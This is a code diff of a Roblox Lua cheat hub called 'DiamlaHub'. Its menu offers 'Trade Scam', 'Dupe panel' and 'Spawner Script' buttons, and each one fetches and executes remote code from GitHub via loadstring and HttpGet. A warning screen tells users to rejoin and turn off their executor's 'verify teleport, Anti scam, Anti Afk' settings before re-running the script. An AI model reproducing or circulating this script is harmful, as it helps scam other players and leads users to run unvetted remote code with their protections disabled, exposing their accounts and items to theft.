@@ -5,7 +5,10 @@ if _G.DiamlaHub_Cleanup then
     _G.DiamlaHub_Cleanup()
 end
 
--- Create ScreenGui
+-- === Global control ===
+_G.DiamlaHub_Threads = {}
+_G.DiamlaHub_Active = true
+
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
@@ -13,10 +16,6 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DiamlaHubGUI"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
-
--- === Global control for loaded scripts ===
-_G.DiamlaHub_Threads = {}
-_G.DiamlaHub_Active = true
 
 -- Cleanup function
 local function cleanupAll()
@@ -36,7 +35,6 @@ local function cleanupAll()
     end
 end
 
--- Make cleanup callable globally so re-execution kills old one
 _G.DiamlaHub_Cleanup = cleanupAll
 
 -- === Loading Screen ===
@@ -57,7 +55,6 @@ loadingLabel.Font = Enum.Font.GothamBold
 loadingLabel.TextSize = 22
 loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- New middle label
 local middleLabel = Instance.new("TextLabel", loadingFrame)
 middleLabel.Size = UDim2.new(1, 0, 0.25, 0)
 middleLabel.Position = UDim2.new(0, 0, 0.4, 0)
@@ -79,15 +76,22 @@ loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 loadingBar.BorderSizePixel = 0
 Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 10)
 
--- Animate loading bar for 10 seconds
+-- Tween the loading bar
 local TweenService = game:GetService("TweenService")
-local goal = { Size = UDim2.new(1, 0, 1, 0) }
 local tweenInfo = TweenInfo.new(10, Enum.EasingStyle.Linear)
+local goal = { Size = UDim2.new(1, 0, 1, 0) }
 local tween = TweenService:Create(loadingBar, tweenInfo, goal)
+
+-- After tween completes, show warning
+tween.Completed:Connect(function()
+    loadingFrame:Destroy()
+    showWarningPrompt(showMainUI)
+end)
+
 tween:Play()
 
 -- === Warning Prompt ===
-local function showWarningPrompt(onClose)
+function showWarningPrompt(onClose)
     local warnFrame = Instance.new("Frame")
     warnFrame.Size = UDim2.new(0, 300, 0, 220)
     warnFrame.Position = UDim2.new(0.5, -150, 0.5, -110)
@@ -100,7 +104,6 @@ local function showWarningPrompt(onClose)
     stroke.Thickness = 1
     stroke.Color = Color3.fromRGB(255, 255, 255)
 
-    -- ⚠️ IMPORTANT ⚠️ header
     local header = Instance.new("TextLabel")
     header.Size = UDim2.new(1, -20, 0, 30)
     header.Position = UDim2.new(0, 10, 0, 5)
@@ -111,12 +114,11 @@ local function showWarningPrompt(onClose)
     header.TextSize = 18
     header.Parent = warnFrame
 
-    -- Instructions
     local msg = Instance.new("TextLabel")
     msg.Size = UDim2.new(1, -20, 1, -70)
     msg.Position = UDim2.new(0, 10, 0, 40)
     msg.BackgroundTransparency = 1
-    msg.Text = "1.Rejoin\n2.Go to delta settings\n3.Turn off verify teleport, Anti scam, Anti Afk\n4.Reexecute\n5.You're all set"
+    msg.Text = "1. Rejoin\n2. Go to delta settings\n3. Turn off verify teleport, Anti scam, Anti Afk\n4. Reexecute\n5. You're all set"
     msg.TextWrapped = true
     msg.TextColor3 = Color3.fromRGB(255, 255, 255)
     msg.Font = Enum.Font.Gotham
@@ -142,8 +144,8 @@ local function showWarningPrompt(onClose)
     end)
 end
 
--- === Main GUI ===
-local function showMainUI()
+-- === Main UI ===
+function showMainUI()
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 300, 0, 270)
     frame.Position = UDim2.new(0.5, -150, 0.5, -135)
@@ -157,7 +159,6 @@ local function showMainUI()
     stroke.Color = Color3.fromRGB(255, 255, 255)
     stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
-    -- Title
     local title = Instance.new("TextLabel", frame)
     title.Size = UDim2.new(1, -40, 0, 40)
     title.Position = UDim2.new(0, 10, 0, 0)
@@ -168,7 +169,6 @@ local function showMainUI()
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.TextXAlignment = Enum.TextXAlignment.Left
 
-    -- Close Button
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, 30, 0, 30)
     closeBtn.Position = UDim2.new(1, -35, 0, 5)
@@ -180,64 +180,10 @@ local function showMainUI()
     closeBtn.TextSize = 18
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
 
-    local function confirmAndDestroy()
-        local confirmGui = Instance.new("Frame")
-        confirmGui.Size = UDim2.new(0, 240, 0, 100)
-        confirmGui.Position = UDim2.new(0.5, -120, 0.5, -50)
-        confirmGui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-        confirmGui.BorderSizePixel = 0
-        confirmGui.Parent = screenGui
-        Instance.new("UICorner", confirmGui).CornerRadius = UDim.new(0, 10)
+    closeBtn.MouseButton1Click:Connect(function()
+        cleanupAll()
+    end)
 
-        local stroke = Instance.new("UIStroke", confirmGui)
-        stroke.Thickness = 1
-        stroke.Color = Color3.fromRGB(255, 255, 255)
-
-        local msg = Instance.new("TextLabel")
-        msg.Size = UDim2.new(1, -20, 0, 40)
-        msg.Position = UDim2.new(0, 10, 0, 10)
-        msg.BackgroundTransparency = 1
-        msg.Text = "Are you sure you want to destroy the GUI?"
-        msg.TextWrapped = true
-        msg.TextColor3 = Color3.fromRGB(255, 255, 255)
-        msg.Font = Enum.Font.Gotham
-        msg.TextSize = 14
-        msg.Parent = confirmGui
-
-        local yesBtn = Instance.new("TextButton")
-        yesBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        yesBtn.Position = UDim2.new(0.05, 0, 1, -40)
-        yesBtn.Text = "Yes"
-        yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-        yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        yesBtn.Font = Enum.Font.GothamBold
-        yesBtn.TextSize = 14
-        yesBtn.Parent = confirmGui
-        Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 6)
-
-        local noBtn = Instance.new("TextButton")
-        noBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        noBtn.Position = UDim2.new(0.5, 0, 1, -40)
-        noBtn.Text = "No"
-        noBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-        noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        noBtn.Font = Enum.Font.GothamBold
-        noBtn.TextSize = 14
-        noBtn.Parent = confirmGui
-        Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 6)
-
-        yesBtn.MouseButton1Click:Connect(function()
-            cleanupAll()
-        end)
-
-        noBtn.MouseButton1Click:Connect(function()
-            confirmGui:Destroy()
-        end)
-    end
-
-    closeBtn.MouseButton1Click:Connect(confirmAndDestroy)
-
-    -- Footer
     local footer = Instance.new("TextLabel", frame)
     footer.Size = UDim2.new(1, 0, 0, 25)
     footer.Position = UDim2.new(0, 0, 1, -25)
@@ -272,8 +218,8 @@ local function showMainUI()
         end
     end)
 
-    -- Function to create buttons
-    local function createButton(text, yOffset, scriptCode)
+    -- Buttons
+    local function createButton(text, yOffset, code)
         local btn = Instance.new("TextButton", frame)
         btn.Size = UDim2.new(0, 200, 0, 40)
         btn.Position = UDim2.new(0.5, -100, 0, yOffset)
@@ -282,37 +228,24 @@ local function showMainUI()
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
         btn.Font = Enum.Font.GothamBold
         btn.TextSize = 18
-        btn.TextWrapped = true
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
-
-        local btnStroke = Instance.new("UIStroke", btn)
-        btnStroke.Thickness = 1.5
-        btnStroke.Color = Color3.fromRGB(255, 255, 255)
-        btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
         btn.MouseButton1Click:Connect(function()
             if not _G.DiamlaHub_Active then return end
             local success, result = pcall(function()
-                return loadstring(scriptCode)()
+                return loadstring(code)()
             end)
             if success and result then
                 if typeof(result) == "RBXScriptConnection" or typeof(result) == "Instance" or typeof(result) == "function" then
                     table.insert(_G.DiamlaHub_Threads, result)
                 end
             elseif not success then
-                warn("Error loading script: " .. tostring(result))
+                warn("Error loading script: "..tostring(result))
             end
         end)
     end
 
-    -- Buttons
-    local buttonNames = {
-        "Trade Scam",
-        "Dupe panel",
-        "Mutation predictor",
-        "Spawner Script"
-    }
-
+    local buttonNames = {"Trade Scam", "Dupe panel", "Mutation predictor", "Spawner Script"}
     local scripts = {
         'loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamlaHub/Trade/refs/heads/main/TradeScript"))()',
         'loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamlaHub/Dupe/refs/heads/main/DupeScript"))()',
@@ -324,12 +257,6 @@ local function showMainUI()
     }
 
     for i, code in ipairs(scripts) do
-        createButton(buttonNames[i], 40 + (i - 1) * 45, code)
+        createButton(buttonNames[i], 50 + (i-1)*45, code)
     end
 end
-
--- After loading, show warning, then main UI
-task.delay(10, function()
-    loadingFrame:Destroy()
-    showWarningPrompt(showMainUI)
-end)
